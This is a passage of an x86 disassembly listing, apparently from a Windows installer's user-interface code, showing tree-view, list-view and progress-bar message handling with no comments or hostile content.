  404336:	ff 74 bb 30          	push   0x30(%ebx,%edi,4)
  40433a:	6a 15                	push   $0x15
  40433c:	55                   	push   %ebp
  40433d:	e8 85 0f 00 00       	call   0x4052c7
  404342:	ff 74 bb 34          	push   0x34(%ebx,%edi,4)
  404346:	6a 16                	push   $0x16
  404348:	55                   	push   %ebp
  404349:	e8 79 0f 00 00       	call   0x4052c7
  40434e:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  404352:	33 db                	xor    %ebx,%ebx
  404354:	33 f6                	xor    %esi,%esi
  404356:	39 1d 2c 40 42 00    	cmp    %ebx,0x42402c
  40435c:	0f 8e c7 00 00 00    	jle    0x404429
  404362:	8b 7c 24 18          	mov    0x18(%esp),%edi
  404366:	83 c7 18             	add    $0x18,%edi
  404369:	80 3f 00             	cmpb   $0x0,(%edi)
  40436c:	0f 84 9c 00 00 00    	je     0x40440e
  404372:	8b 47 f0             	mov    -0x10(%edi),%eax
  404375:	6a 20                	push   $0x20
  404377:	59                   	pop    %ecx
  404378:	23 c1                	and    %ecx,%eax
  40437a:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  40437e:	f6 47 f0 02          	testb  $0x2,-0x10(%edi)
  404382:	c7 44 24 2c 02 00 ff 	movl   $0xffff0002,0x2c(%esp)
  404389:	ff 
  40438a:	c7 44 24 30 0d 00 00 	movl   $0xd,0x30(%esp)
  404391:	00 
  404392:	89 4c 24 3c          	mov    %ecx,0x3c(%esp)
  404396:	89 74 24 54          	mov    %esi,0x54(%esp)
  40439a:	89 7c 24 40          	mov    %edi,0x40(%esp)
  40439e:	89 44 24 38          	mov    %eax,0x38(%esp)
  4043a2:	74 35                	je     0x4043d9
  4043a4:	33 c0                	xor    %eax,%eax
  4043a6:	c7 44 24 30 4d 00 00 	movl   $0x4d,0x30(%esp)
  4043ad:	00 
  4043ae:	40                   	inc    %eax
  4043af:	89 44 24 50          	mov    %eax,0x50(%esp)
  4043b3:	8d 44 24 28          	lea    0x28(%esp),%eax
  4043b7:	50                   	push   %eax
  4043b8:	6a 00                	push   $0x0
  4043ba:	68 00 11 00 00       	push   $0x1100
  4043bf:	55                   	push   %ebp
  4043c0:	ff 15 40 82 40 00    	call   *0x408240
  4043c6:	8b d8                	mov    %eax,%ebx
  4043c8:	a1 f4 0d 42 00       	mov    0x420df4,%eax
  4043cd:	89 1c b0             	mov    %ebx,(%eax,%esi,4)
  4043d0:	33 c0                	xor    %eax,%eax
  4043d2:	40                   	inc    %eax
  4043d3:	89 44 24 14          	mov    %eax,0x14(%esp)
  4043d7:	eb 39                	jmp    0x404412
  4043d9:	f6 47 f0 04          	testb  $0x4,-0x10(%edi)
  4043dd:	74 13                	je     0x4043f2
  4043df:	53                   	push   %ebx
  4043e0:	6a 03                	push   $0x3
  4043e2:	68 0a 11 00 00       	push   $0x110a
  4043e7:	55                   	push   %ebp
  4043e8:	ff 15 40 82 40 00    	call   *0x408240
  4043ee:	8b d8                	mov    %eax,%ebx
  4043f0:	eb 1c                	jmp    0x40440e
  4043f2:	8d 44 24 28          	lea    0x28(%esp),%eax
  4043f6:	50                   	push   %eax
  4043f7:	6a 00                	push   $0x0
  4043f9:	68 00 11 00 00       	push   $0x1100
  4043fe:	55                   	push   %ebp
  4043ff:	ff 15 40 82 40 00    	call   *0x408240
  404405:	8b 0d f4 0d 42 00    	mov    0x420df4,%ecx
  40440b:	89 04 b1             	mov    %eax,(%ecx,%esi,4)
  40440e:	8b 44 24 14          	mov    0x14(%esp),%eax
  404412:	46                   	inc    %esi
  404413:	81 c7 18 04 00 00    	add    $0x418,%edi
  404419:	3b 35 2c 40 42 00    	cmp    0x42402c,%esi
  40441f:	0f 8c 44 ff ff ff    	jl     0x404369
  404425:	85 c0                	test   %eax,%eax
  404427:	75 16                	jne    0x40443f
  404429:	6a f0                	push   $0xfffffff0
  40442b:	55                   	push   %ebp
  40442c:	ff 15 74 82 40 00    	call   *0x408274
  404432:	83 e0 fb             	and    $0xfffffffb,%eax
  404435:	50                   	push   %eax
  404436:	6a f0                	push   $0xfffffff0
  404438:	55                   	push   %ebp
  404439:	ff 15 14 82 40 00    	call   *0x408214
  40443f:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  404444:	75 10                	jne    0x404456
  404446:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  40444a:	6a 05                	push   $0x5
  40444c:	57                   	push   %edi
  40444d:	ff 15 30 82 40 00    	call   *0x408230
  404453:	57                   	push   %edi
  404454:	eb 01                	jmp    0x404457
  404456:	55                   	push   %ebp
  404457:	e8 54 0e 00 00       	call   0x4052b0
  40445c:	b9 0f 04 00 00       	mov    $0x40f,%ecx
  404461:	8d 51 f6             	lea    -0xa(%ecx),%edx
  404464:	39 54 24 68          	cmp    %edx,0x68(%esp)
  404468:	0f 45 4c 24 68       	cmovne 0x68(%esp),%ecx
  40446d:	33 c0                	xor    %eax,%eax
  40446f:	39 54 24 68          	cmp    %edx,0x68(%esp)
  404473:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  404477:	0f 45 44 24 6c       	cmovne 0x6c(%esp),%eax
  40447c:	33 f6                	xor    %esi,%esi
  40447e:	46                   	inc    %esi
  40447f:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  404483:	39 54 24 68          	cmp    %edx,0x68(%esp)
  404487:	0f 45 74 24 70       	cmovne 0x70(%esp),%esi
  40448c:	83 c2 0e             	add    $0xe,%edx
  40448f:	83 f9 4e             	cmp    $0x4e,%ecx
  404492:	74 0e                	je     0x4044a2
  404494:	8b fe                	mov    %esi,%edi
  404496:	8b d8                	mov    %eax,%ebx
  404498:	8b e9                	mov    %ecx,%ebp
  40449a:	3b ca                	cmp    %edx,%ecx
  40449c:	0f 85 18 01 00 00    	jne    0x4045ba
  4044a2:	3b ca                	cmp    %edx,%ecx
  4044a4:	74 13                	je     0x4044b9
  4044a6:	81 7e 04 08 04 00 00 	cmpl   $0x408,0x4(%esi)
  4044ad:	8b fe                	mov    %esi,%edi
  4044af:	8b d8                	mov    %eax,%ebx
  4044b1:	8b e9                	mov    %ecx,%ebp
  4044b3:	0f 85 01 01 00 00    	jne    0x4045ba
  4044b9:	f7 05 0c 40 42 00 00 	testl  $0x200,0x42400c
  4044c0:	02 00 00 
  4044c3:	8b fe                	mov    %esi,%edi
  4044c5:	8b d8                	mov    %eax,%ebx
  4044c7:	8b e9                	mov    %ecx,%ebp
  4044c9:	0f 85 9e 00 00 00    	jne    0x40456d
  4044cf:	3b ca                	cmp    %edx,%ecx
  4044d1:	74 0a                	je     0x4044dd
  4044d3:	83 7e 08 fe          	cmpl   $0xfffffffe,0x8(%esi)
  4044d7:	0f 85 90 00 00 00    	jne    0x40456d
  4044dd:	33 c0                	xor    %eax,%eax
  4044df:	3b ca                	cmp    %edx,%ecx
  4044e1:	0f 95 c0             	setne  %al
  4044e4:	50                   	push   %eax
  4044e5:	ff 74 24 14          	push   0x14(%esp)
  4044e9:	e8 2f 0f 00 00       	call   0x40541d
  4044ee:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4044f2:	8b d0                	mov    %eax,%edx
  4044f4:	8b 44 24 6c          	mov    0x6c(%esp),%eax
  4044f8:	8b fe                	mov    %esi,%edi
  4044fa:	89 54 24 70          	mov    %edx,0x70(%esp)
  4044fe:	8b d8                	mov    %eax,%ebx
  404500:	8b e9                	mov    %ecx,%ebp
  404502:	85 d2                	test   %edx,%edx
  404504:	78 67                	js     0x40456d
  404506:	8b 7c 24 18          	mov    0x18(%esp),%edi
  40450a:	69 d2 18 04 00 00    	imul   $0x418,%edx,%edx
  404510:	89 54 24 68          	mov    %edx,0x68(%esp)
  404514:	8b 54 3a 08          	mov    0x8(%edx,%edi,1),%edx
  404518:	8b fe                	mov    %esi,%edi
  40451a:	f6 c2 10             	test   $0x10,%dl
  40451d:	75 4e                	jne    0x40456d
  40451f:	f6 c2 40             	test   $0x40,%dl
  404522:	74 18                	je     0x40453c
  404524:	81 f2 80 00 00 00    	xor    $0x80,%edx
  40452a:	8b c2                	mov    %edx,%eax
  40452c:	8b ca                	mov    %edx,%ecx
  40452e:	83 e0 fe             	and    $0xfffffffe,%eax
  404531:	83 ca 01             	or     $0x1,%edx
  404534:	80 e1 80             	and    $0x80,%cl
  404537:	0f 44 d0             	cmove  %eax,%edx
  40453a:	eb 05                	jmp    0x404541
  40453c:	33 c0                	xor    %eax,%eax
  40453e:	40                   	inc    %eax
  40453f:	33 d0                	xor    %eax,%edx
  404541:	8b 44 24 68          	mov    0x68(%esp),%eax
  404545:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  404549:	8b 5c 24 70          	mov    0x70(%esp),%ebx
  40454d:	53                   	push   %ebx
  40454e:	89 54 08 08          	mov    %edx,0x8(%eax,%ecx,1)
  404552:	e8 ca cc ff ff       	call   0x401221
  404557:	8b 3d 0c 40 42 00    	mov    0x42400c,%edi
  40455d:	33 c0                	xor    %eax,%eax
  40455f:	c1 ef 08             	shr    $0x8,%edi
  404562:	40                   	inc    %eax
  404563:	f7 d7                	not    %edi
  404565:	43                   	inc    %ebx
  404566:	23 f8                	and    %eax,%edi
  404568:	bd 0f 04 00 00       	mov    $0x40f,%ebp
  40456d:	85 f6                	test   %esi,%esi
  40456f:	74 49                	je     0x4045ba
  404571:	8b 46 08             	mov    0x8(%esi),%eax
  404574:	3d 6e fe ff ff       	cmp    $0xfffffe6e,%eax
  404579:	75 17                	jne    0x404592
  40457b:	ff 76 5c             	push   0x5c(%esi)
  40457e:	6a 00                	push   $0x0
  404580:	68 19 04 00 00       	push   $0x419
  404585:	ff 74 24 1c          	push   0x1c(%esp)
  404589:	ff 15 40 82 40 00    	call   *0x408240
  40458f:	8b 46 08             	mov    0x8(%esi),%eax
  404592:	3d 6a fe ff ff       	cmp    $0xfffffe6a,%eax
  404597:	75 21                	jne    0x4045ba
  404599:	69 4e 5c 18 04 00 00 	imul   $0x418,0x5c(%esi),%ecx
  4045a0:	83 7e 0c 02          	cmpl   $0x2,0xc(%esi)
  4045a4:	8b 54 24 18          	mov    0x18(%esp),%edx
  4045a8:	8b 44 11 08          	mov    0x8(%ecx,%edx,1),%eax
  4045ac:	75 05                	jne    0x4045b3
  4045ae:	83 c8 20             	or     $0x20,%eax
  4045b1:	eb 03                	jmp    0x4045b6
  4045b3:	83 e0 df             	and    $0xffffffdf,%eax
  4045b6:	89 44 11 08          	mov    %eax,0x8(%ecx,%edx,1)
  4045ba:	8b c3                	mov    %ebx,%eax
  4045bc:	8b cf                	mov    %edi,%ecx
  4045be:	89 44 24 70          	mov    %eax,0x70(%esp)
  4045c2:	8b f5                	mov    %ebp,%esi
  4045c4:	89 4c 24 68          	mov    %ecx,0x68(%esp)
  4045c8:	6a 08                	push   $0x8
  4045ca:	5a                   	pop    %edx
  4045cb:	81 fd 11 01 00 00    	cmp    $0x111,%ebp
  4045d1:	0f 85 95 00 00 00    	jne    0x40466c
  4045d7:	b8 f9 03 00 00       	mov    $0x3f9,%eax
  4045dc:	66 3b d8             	cmp    %ax,%bx
  4045df:	0f 85 fc 02 00 00    	jne    0x4048e1
  4045e5:	33 c9                	xor    %ecx,%ecx
  4045e7:	8b c3                	mov    %ebx,%eax
  4045e9:	c1 e8 10             	shr    $0x10,%eax
  4045ec:	41                   	inc    %ecx
  4045ed:	66 3b c1             	cmp    %cx,%ax
  4045f0:	0f 85 eb 02 00 00    	jne    0x4048e1
  4045f6:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  4045fa:	6a 00                	push   $0x0
  4045fc:	6a 00                	push   $0x0
  4045fe:	68 47 01 00 00       	push   $0x147
  404603:	56                   	push   %esi
  404604:	ff 15 40 82 40 00    	call   *0x408240
  40460a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40460d:	0f 84 ce 02 00 00    	je     0x4048e1
  404613:	8b 1d 40 82 40 00    	mov    0x408240,%ebx
  404619:	6a 00                	push   $0x0
  40461b:	50                   	push   %eax
  40461c:	68 50 01 00 00       	push   $0x150
  404621:	56                   	push   %esi
  404622:	ff d3                	call   *%ebx
  404624:	8b f0                	mov    %eax,%esi
  404626:	83 fe ff             	cmp    $0xffffffff,%esi
  404629:	74 0e                	je     0x404639
  40462b:	8b 44 24 20          	mov    0x20(%esp),%eax
  40462f:	83 bc b0 94 00 00 00 	cmpl   $0x0,0x94(%eax,%esi,4)
  404636:	00 
  404637:	75 03                	jne    0x40463c
  404639:	6a 20                	push   $0x20
  40463b:	5e                   	pop    %esi
  40463c:	56                   	push   %esi
  40463d:	e8 4e cc ff ff       	call   0x401290
  404642:	56                   	push   %esi
  404643:	33 f6                	xor    %esi,%esi
  404645:	56                   	push   %esi
  404646:	68 20 04 00 00       	push   $0x420
  40464b:	ff 74 24 70          	push   0x70(%esp)
  40464f:	ff d3                	call   *%ebx
  404651:	83 cb ff             	or     $0xffffffff,%ebx
  404654:	8b fe                	mov    %esi,%edi
  404656:	bd 0f 04 00 00       	mov    $0x40f,%ebp
  40465b:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  40465f:	89 7c 24 68          	mov    %edi,0x68(%esp)
  404663:	89 6c 24 70          	mov    %ebp,0x70(%esp)
  404667:	e9 86 00 00 00       	jmp    0x4046f2
  40466c:	8b d8                	mov    %eax,%ebx
  40466e:	8b f9                	mov    %ecx,%edi
  404670:	b8 00 02 00 00       	mov    $0x200,%eax
  404675:	8b ee                	mov    %esi,%ebp
  404677:	3b f0                	cmp    %eax,%esi
  404679:	75 1c                	jne    0x404697
  40467b:	6a 00                	push   $0x0
  40467d:	6a 00                	push   $0x0
  40467f:	50                   	push   %eax
  404680:	ff 74 24 1c          	push   0x1c(%esp)
  404684:	ff 15 40 82 40 00    	call   *0x408240
  40468a:	8b 7c 24 68          	mov    0x68(%esp),%edi
  40468e:	8b 5c 24 70          	mov    0x70(%esp),%ebx
  404692:	e9 4a 02 00 00       	jmp    0x4048e1
  404697:	8b c5                	mov    %ebp,%eax
  404699:	81 fd 0b 04 00 00    	cmp    $0x40b,%ebp
  40469f:	75 36                	jne    0x4046d7
  4046a1:	a1 f8 0d 42 00       	mov    0x420df8,%eax
  4046a6:	85 c0                	test   %eax,%eax
  4046a8:	74 07                	je     0x4046b1
  4046aa:	50                   	push   %eax
  4046ab:	ff 15 3c 80 40 00    	call   *0x40803c
  4046b1:	a1 f4 0d 42 00       	mov    0x420df4,%eax
  4046b6:	85 c0                	test   %eax,%eax
  4046b8:	74 07                	je     0x4046c1
  4046ba:	50                   	push   %eax
  4046bb:	ff 15 f0 80 40 00    	call   *0x4080f0
  4046c1:	33 c0                	xor    %eax,%eax
  4046c3:	a3 f8 0d 42 00       	mov    %eax,0x420df8
  4046c8:	a3 f4 0d 42 00       	mov    %eax,0x420df4
  4046cd:	a3 b8 40 42 00       	mov    %eax,0x4240b8
  4046d2:	e9 0a 02 00 00       	jmp    0x4048e1
  4046d7:	89 4c 24 68          	mov    %ecx,0x68(%esp)
  4046db:	8b e8                	mov    %eax,%ebp
  4046dd:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  4046e1:	89 6c 24 70          	mov    %ebp,0x70(%esp)
  4046e5:	3d 0f 04 00 00       	cmp    $0x40f,%eax
  4046ea:	0f 85 b3 01 00 00    	jne    0x4048a3
  4046f0:	33 f6                	xor    %esi,%esi
  4046f2:	56                   	push   %esi
  4046f3:	56                   	push   %esi
  4046f4:	e8 e4 cb ff ff       	call   0x4012dd
  4046f9:	85 db                	test   %ebx,%ebx
  4046fb:	74 11                	je     0x40470e
  4046fd:	83 fb ff             	cmp    $0xffffffff,%ebx
  404700:	8d 43 ff             	lea    -0x1(%ebx),%eax
  404703:	0f 44 c3             	cmove  %ebx,%eax
  404706:	50                   	push   %eax
  404707:	6a 08                	push   $0x8
  404709:	e8 55 0b 00 00       	call   0x405263
  40470e:	85 ff                	test   %edi,%edi
  404710:	74 54                	je     0x404766
  404712:	ff 35 f4 0d 42 00    	push   0x420df4
  404718:	e8 83 ca ff ff       	call   0x4011a0
  40471d:	8b f8                	mov    %eax,%edi
  40471f:	57                   	push   %edi
  404720:	89 7c 24 6c          	mov    %edi,0x6c(%esp)
  404724:	e8 67 cb ff ff       	call   0x401290
  404729:	8b ce                	mov    %esi,%ecx
  40472b:	8b d6                	mov    %esi,%edx
  40472d:	85 ff                	test   %edi,%edi
  40472f:	7e 1b                	jle    0x40474c
  404731:	8b 74 24 20          	mov    0x20(%esp),%esi
  404735:	83 bc 96 94 00 00 00 	cmpl   $0x0,0x94(%esi,%edx,4)
  40473c:	00 
  40473d:	8d 41 01             	lea    0x1(%ecx),%eax
  404740:	0f 44 c1             	cmove  %ecx,%eax
  404743:	42                   	inc    %edx
  404744:	8b c8                	mov    %eax,%ecx
  404746:	3b d7                	cmp    %edi,%edx
  404748:	7c eb                	jl     0x404735
  40474a:	33 f6                	xor    %esi,%esi
  40474c:	56                   	push   %esi
  40474d:	51                   	push   %ecx
  40474e:	68 4e 01 00 00       	push   $0x14e
  404753:	ff 74 24 28          	push   0x28(%esp)
  404757:	ff 15 40 82 40 00    	call   *0x408240
  40475d:	bd 20 04 00 00       	mov    $0x420,%ebp
  404762:	89 6c 24 70          	mov    %ebp,0x70(%esp)
  404766:	56                   	push   %esi
  404767:	56                   	push   %esi
  404768:	e8 70 cb ff ff       	call   0x4012dd
  40476d:	8b 0d 2c 40 42 00    	mov    0x42402c,%ecx
  404773:	a1 f4 0d 42 00       	mov    0x420df4,%eax
  404778:	89 74 24 6c          	mov    %esi,0x6c(%esp)
  40477c:	8b 35 28 40 42 00    	mov    0x424028,%esi
  404782:	c7 44 24 34 30 f0 00 	movl   $0xf030,0x34(%esp)
  404789:	00 
  40478a:	85 c9                	test   %ecx,%ecx
  40478c:	0f 8e cf 00 00 00    	jle    0x404861
  404792:	8b 5c 24 6c          	mov    0x6c(%esp),%ebx
  404796:	83 c6 08             	add    $0x8,%esi
  404799:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40479d:	8b e8                	mov    %eax,%ebp
  40479f:	8b 44 9d 00          	mov    0x0(%ebp,%ebx,4),%eax
  4047a3:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  4047a7:	85 c0                	test   %eax,%eax
  4047a9:	0f 84 97 00 00 00    	je     0x404846
  4047af:	8b 16                	mov    (%esi),%edx
  4047b1:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4047b5:	c7 44 24 28 08 00 00 	movl   $0x8,0x28(%esp)
  4047bc:	00 
  4047bd:	f7 c2 00 01 00 00    	test   $0x100,%edx
  4047c3:	74 1d                	je     0x4047e2
  4047c5:	8d 46 10             	lea    0x10(%esi),%eax
  4047c8:	c7 44 24 28 09 00 00 	movl   $0x9,0x28(%esp)
  4047cf:	00 
  4047d0:	89 44 24 38          	mov    %eax,0x38(%esp)
  4047d4:	81 26 ff fe ff ff    	andl   $0xfffffeff,(%esi)
  4047da:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4047de:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  4047e2:	f6 c2 40             	test   $0x40,%dl
  4047e5:	74 05                	je     0x4047ec
  4047e7:	6a 03                	push   $0x3
  4047e9:	59                   	pop    %ecx
  4047ea:	eb 10                	jmp    0x4047fc
  4047ec:	33 c0                	xor    %eax,%eax
  4047ee:	8b ca                	mov    %edx,%ecx
  4047f0:	40                   	inc    %eax
  4047f1:	23 c8                	and    %eax,%ecx
  4047f3:	41                   	inc    %ecx
  4047f4:	f6 c2 10             	test   $0x10,%dl
  4047f7:	74 03                	je     0x4047fc
  4047f9:	83 c1 03             	add    $0x3,%ecx
  4047fc:	ff 74 24 6c          	push   0x6c(%esp)
  404800:	8b c2                	mov    %edx,%eax
  404802:	c1 e1 0b             	shl    $0xb,%ecx
  404805:	83 e0 08             	and    $0x8,%eax
  404808:	0b c8                	or     %eax,%ecx
  40480a:	8b c2                	mov    %edx,%eax
  40480c:	83 e0 20             	and    $0x20,%eax
  40480f:	c1 fa 05             	sar    $0x5,%edx
  404812:	03 c9                	add    %ecx,%ecx
  404814:	0b c8                	or     %eax,%ecx
  404816:	33 c0                	xor    %eax,%eax
  404818:	40                   	inc    %eax
  404819:	89 4c 24 34          	mov    %ecx,0x34(%esp)
  40481d:	23 d0                	and    %eax,%edx
  40481f:	42                   	inc    %edx
  404820:	52                   	push   %edx
  404821:	68 02 11 00 00       	push   $0x1102
  404826:	57                   	push   %edi
  404827:	ff 15 40 82 40 00    	call   *0x408240
  40482d:	8d 44 24 28          	lea    0x28(%esp),%eax
  404831:	50                   	push   %eax
  404832:	6a 00                	push   $0x0
  404834:	68 0d 11 00 00       	push   $0x110d
  404839:	57                   	push   %edi
  40483a:	ff 15 40 82 40 00    	call   *0x408240
  404840:	8b 0d 2c 40 42 00    	mov    0x42402c,%ecx
  404846:	43                   	inc    %ebx
  404847:	81 c6 18 04 00 00    	add    $0x418,%esi
  40484d:	3b d9                	cmp    %ecx,%ebx
  40484f:	0f 8c 4a ff ff ff    	jl     0x40479f
  404855:	8b 7c 24 68          	mov    0x68(%esp),%edi
  404859:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  40485d:	8b 6c 24 70          	mov    0x70(%esp),%ebp
  404861:	b8 00 04 00 00       	mov    $0x400,%eax
  404866:	66 39 05 fe 40 42 00 	cmp    %ax,0x4240fe
  40486d:	75 10                	jne    0x40487f
  40486f:	33 c0                	xor    %eax,%eax
  404871:	40                   	inc    %eax
  404872:	50                   	push   %eax
  404873:	6a 00                	push   $0x0
  404875:	ff 74 24 18          	push   0x18(%esp)
  404879:	ff 15 18 82 40 00    	call   *0x408218
  40487f:	a1 e0 37 42 00       	mov    0x4237e0,%eax
  404884:	83 78 10 00          	cmpl   $0x0,0x10(%eax)
  404888:	74 16                	je     0x4048a0
  40488a:	6a 05                	push   $0x5
  40488c:	e8 e7 0c 00 00       	call   0x405578
  404891:	6a 00                	push   $0x0
  404893:	50                   	push   %eax
  404894:	6a fb                	push   $0xfffffffb
  404896:	68 ff 03 00 00       	push   $0x3ff
  40489b:	e8 6d 0a 00 00       	call   0x40530d
  4048a0:	6a 08                	push   $0x8
  4048a2:	5a                   	pop    %edx
  4048a3:	81 fd 20 04 00 00    	cmp    $0x420,%ebp
  4048a9:	75 36                	jne    0x4048e1
  4048ab:	f7 05 0c 40 42 00 00 	testl  $0x100,0x42400c
  4048b2:	01 00 00 
  4048b5:	74 2a                	je     0x4048e1
  4048b7:	33 f6                	xor    %esi,%esi
  4048b9:	83 ff 20             	cmp    $0x20,%edi
  4048bc:	0f 44 f2             	cmove  %edx,%esi
  4048bf:	56                   	push   %esi
  4048c0:	ff 74 24 14          	push   0x14(%esp)
  4048c4:	ff 15 30 82 40 00    	call   *0x408230
  4048ca:	56                   	push   %esi
  4048cb:	68 fe 03 00 00       	push   $0x3fe
  4048d0:	ff 74 24 6c          	push   0x6c(%esp)
  4048d4:	ff 15 2c 82 40 00    	call   *0x40822c
  4048da:	50                   	push   %eax
  4048db:	ff 15 30 82 40 00    	call   *0x408230
  4048e1:	57                   	push   %edi
  4048e2:	53                   	push   %ebx
  4048e3:	55                   	push   %ebp
  4048e4:	e8 b5 0b 00 00       	call   0x40549e
  4048e9:	5f                   	pop    %edi
  4048ea:	5e                   	pop    %esi
  4048eb:	5d                   	pop    %ebp
  4048ec:	5b                   	pop    %ebx
  4048ed:	83 c4 50             	add    $0x50,%esp
  4048f0:	c2 10 00             	ret    $0x10
  4048f3:	83 ec 4c             	sub    $0x4c,%esp
  4048f6:	53                   	push   %ebx
  4048f7:	8b 1d e8 37 42 00    	mov    0x4237e8,%ebx
  4048fd:	55                   	push   %ebp
  4048fe:	56                   	push   %esi
  4048ff:	57                   	push   %edi
  404900:	8b 7c 24 64          	mov    0x64(%esp),%edi
  404904:	81 ff 10 01 00 00    	cmp    $0x110,%edi
  40490a:	0f 85 8c 01 00 00    	jne    0x404a9c
  404910:	83 4c 24 34 ff       	orl    $0xffffffff,0x34(%esp)
  404915:	8d 7c 24 38          	lea    0x38(%esp),%edi
  404919:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%esp)
  404920:	00 
  404921:	33 c0                	xor    %eax,%eax
  404923:	33 f6                	xor    %esi,%esi
  404925:	8b 1d 2c 82 40 00    	mov    0x40822c,%ebx
  40492b:	89 74 24 24          	mov    %esi,0x24(%esp)
  40492f:	89 74 24 2c          	mov    %esi,0x2c(%esp)
  404933:	89 74 24 30          	mov    %esi,0x30(%esp)
  404937:	ab                   	stos   %eax,%es:(%edi)
  404938:	68 03 04 00 00       	push   $0x403
  40493d:	ff 74 24 64          	push   0x64(%esp)
  404941:	ab                   	stos   %eax,%es:(%edi)
  404942:	ab                   	stos   %eax,%es:(%edi)
  404943:	ab                   	stos   %eax,%es:(%edi)
  404944:	ab                   	stos   %eax,%es:(%edi)
  404945:	a1 10 40 42 00       	mov    0x424010,%eax
  40494a:	8b 68 5c             	mov    0x5c(%eax),%ebp
  40494d:	8b 40 60             	mov    0x60(%eax),%eax
  404950:	89 44 24 70          	mov    %eax,0x70(%esp)
  404954:	ff d3                	call   *%ebx
  404956:	68 ee 03 00 00       	push   $0x3ee
  40495b:	ff 74 24 64          	push   0x64(%esp)
  40495f:	a3 e4 37 42 00       	mov    %eax,0x4237e4
  404964:	ff d3                	call   *%ebx
  404966:	68 f8 03 00 00       	push   $0x3f8
  40496b:	ff 74 24 64          	push   0x64(%esp)
  40496f:	a3 c8 37 42 00       	mov    %eax,0x4237c8
  404974:	ff d3                	call   *%ebx
  404976:	ff 35 e4 37 42 00    	push   0x4237e4
  40497c:	8b d8                	mov    %eax,%ebx
  40497e:	89 1d e8 37 42 00    	mov    %ebx,0x4237e8
  404984:	e8 27 09 00 00       	call   0x4052b0
  404989:	6a 04                	push   $0x4
  40498b:	e8 e8 0b 00 00       	call   0x405578
  404990:	a3 cc 37 42 00       	mov    %eax,0x4237cc
  404995:	8d 44 24 10          	lea    0x10(%esp),%eax
  404999:	50                   	push   %eax
  40499a:	53                   	push   %ebx
  40499b:	89 35 d0 37 42 00    	mov    %esi,0x4237d0
  4049a1:	ff 15 4c 82 40 00    	call   *0x40824c
  4049a7:	6a 02                	push   $0x2
  4049a9:	ff 15 b4 81 40 00    	call   *0x4081b4
  4049af:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4049b3:	8b 3d 40 82 40 00    	mov    0x408240,%edi
  4049b9:	2b c8                	sub    %eax,%ecx
  4049bb:	8d 44 24 20          	lea    0x20(%esp),%eax
  4049bf:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  4049c3:	50                   	push   %eax
  4049c4:	56                   	push   %esi
  4049c5:	68 1b 10 00 00       	push   $0x101b
  4049ca:	53                   	push   %ebx
  4049cb:	ff d7                	call   *%edi
  4049cd:	b8 00 40 00 00       	mov    $0x4000,%eax
  4049d2:	50                   	push   %eax
  4049d3:	50                   	push   %eax
  4049d4:	68 36 10 00 00       	push   $0x1036
  4049d9:	53                   	push   %ebx
  4049da:	ff d7                	call   *%edi
  4049dc:	85 ed                	test   %ebp,%ebp
  4049de:	78 14                	js     0x4049f4
  4049e0:	55                   	push   %ebp
  4049e1:	56                   	push   %esi
  4049e2:	68 01 10 00 00       	push   $0x1001
  4049e7:	53                   	push   %ebx
  4049e8:	ff d7                	call   *%edi
  4049ea:	55                   	push   %ebp
  4049eb:	56                   	push   %esi
  4049ec:	68 26 10 00 00       	push   $0x1026
  4049f1:	53                   	push   %ebx
  4049f2:	ff d7                	call   *%edi
  4049f4:	8b 44 24 68          	mov    0x68(%esp),%eax
  4049f8:	85 c0                	test   %eax,%eax
  4049fa:	78 0a                	js     0x404a06
  4049fc:	50                   	push   %eax
  4049fd:	56                   	push   %esi
  4049fe:	68 24 10 00 00       	push   $0x1024
  404a03:	53                   	push   %ebx
  404a04:	ff d7                	call   *%edi
  404a06:	8b 44 24 6c          	mov    0x6c(%esp),%eax
  404a0a:	ff 70 30             	push   0x30(%eax)
  404a0d:	6a 1b                	push   $0x1b
  404a0f:	ff 74 24 68          	push   0x68(%esp)
  404a13:	e8 af 08 00 00       	call   0x4052c7
  404a18:	f6 05 0c 40 42 00 03 	testb  $0x3,0x42400c
  404a1f:	74 32                	je     0x404a53
  404a21:	56                   	push   %esi
  404a22:	ff 35 e4 37 42 00    	push   0x4237e4
  404a28:	ff 15 30 82 40 00    	call   *0x408230
  404a2e:	f6 05 0c 40 42 00 02 	testb  $0x2,0x42400c
  404a35:	75 0b                	jne    0x404a42
  404a37:	6a 08                	push   $0x8
  404a39:	53                   	push   %ebx
  404a3a:	ff 15 30 82 40 00    	call   *0x408230
  404a40:	eb 06                	jmp    0x404a48
  404a42:	89 35 e4 37 42 00    	mov    %esi,0x4237e4
  404a48:	ff 35 c8 37 42 00    	push   0x4237c8
  404a4e:	e8 5d 08 00 00       	call   0x4052b0
  404a53:	68 ec 03 00 00       	push   $0x3ec
  404a58:	ff 74 24 64          	push   0x64(%esp)
  404a5c:	ff 15 2c 82 40 00    	call   *0x40822c
  404a62:	68 00 00 30 75       	push   $0x75300000
  404a67:	56                   	push   %esi
  404a68:	8b d8                	mov    %eax,%ebx
  404a6a:	68 01 04 00 00       	push   $0x401
  404a6f:	53                   	push   %ebx
  404a70:	ff d7                	call   *%edi
  404a72:	f6 05 0c 40 42 00 04 	testb  $0x4,0x42400c
  404a79:	0f 84 15 02 00 00    	je     0x404c94
  404a7f:	8b 44 24 68          	mov    0x68(%esp),%eax
  404a83:	50                   	push   %eax
  404a84:	56                   	push   %esi
  404a85:	68 09 04 00 00       	push   $0x409
  404a8a:	53                   	push   %ebx
  404a8b:	ff d7                	call   *%edi
  404a8d:	55                   	push   %ebp
  404a8e:	56                   	push   %esi
